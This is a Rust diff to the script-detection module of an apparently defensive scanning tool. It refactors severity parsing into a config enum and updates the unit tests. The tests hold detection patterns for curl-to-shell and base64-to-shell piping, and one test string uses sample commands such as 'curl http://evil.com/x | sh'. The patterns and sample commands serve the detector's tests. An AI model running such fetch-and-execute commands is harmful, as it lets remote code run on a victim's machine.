@@ -2,8 +2,7 @@ use std::path::Path;
 use anyhow::{Context, Result};
 use async_trait::async_trait;
 use regex::Regex;
-use crate::config::ScriptPattern;
-use crate::engine::event::Severity;
+use crate::config::{ScriptPattern, Severity};
 
 #[derive(Debug, Clone)]
 pub struct DetectorMatch {
@@ -40,8 +39,7 @@ impl ScriptDetector {
             .map(|p| {
                 let re = Regex::new(&format!("(?mi){}", p.regex))
                     .with_context(|| format!("invalid script pattern regex {:?}", p.name))?;
-                let severity = parse_severity(&p.severity);
-                Ok(CompiledScriptPattern { name: p.name.clone(), re, severity })
+                Ok(CompiledScriptPattern { name: p.name.clone(), re, severity: p.severity.clone() })
             })
             .collect::<Result<Vec<_>>>()?;
         Ok(Self { patterns: compiled, extensions: extensions.to_vec() })
@@ -77,30 +75,19 @@ impl ContentDetector for ScriptDetector {
     }
 }
 
-fn parse_severity(s: &str) -> Severity {
-    match s.to_lowercase().as_str() {
-        "info"     => Severity::Info,
-        "low"      => Severity::Low,
-        "medium"   => Severity::Medium,
-        "high"     => Severity::High,
-        "critical" => Severity::Critical,
-        _          => Severity::Medium,
-    }
-}
-
 #[cfg(test)]
 mod tests {
     use super::*;
-    use crate::config::ScriptPattern;
+    use crate::config::{ScriptPattern, Severity};
 
-    fn pat(name: &str, regex: &str, severity: &str) -> ScriptPattern {
-        ScriptPattern { name: name.into(), regex: regex.into(), severity: severity.into() }
+    fn pat(name: &str, regex: &str, severity: Severity) -> ScriptPattern {
+        ScriptPattern { name: name.into(), regex: regex.into(), severity }
     }
 
     #[tokio::test]
     async fn detects_curl_pipe_shell() {
         let detector = ScriptDetector::from_config(
-            &[pat("curl_pipe", r"curl\s+.*\|\s*(bash|sh)", "high")],
+            &[pat("curl_pipe", r"curl\s+.*\|\s*(bash|sh)", Severity::High)],
             &["sh".to_string()],
         ).unwrap();
         let path = Path::new("test.sh");
@@ -113,7 +100,7 @@ mod tests {
     #[tokio::test]
     async fn no_false_positives() {
         let detector = ScriptDetector::from_config(
-            &[pat("curl_pipe", r"curl\s+.*\|\s*(bash|sh)", "high")],
+            &[pat("curl_pipe", r"curl\s+.*\|\s*(bash|sh)", Severity::High)],
             &["sh".to_string()],
         ).unwrap();
         let hits = detector.scan(Path::new("test.sh"), "echo 'hello world'").await;
@@ -123,8 +110,8 @@ mod tests {
     #[tokio::test]
     async fn multiple_rules_fire() {
         let detector = ScriptDetector::from_config(&[
-            pat("curl_pipe", r"curl\s+.*\|\s*(bash|sh)", "high"),
-            pat("base64_exec", r"base64\s+-d.*\|\s*(bash|sh)", "critical"),
+            pat("curl_pipe",   r"curl\s+.*\|\s*(bash|sh)",       Severity::High),
+            pat("base64_exec", r"base64\s+-d.*\|\s*(bash|sh)",   Severity::Critical),
         ], &["sh".to_string()]).unwrap();
         let content = "curl http://evil.com/x | sh\necho dGVzdA== | base64 -d | bash";
         let hits = detector.scan(Path::new("test.sh"), content).await;
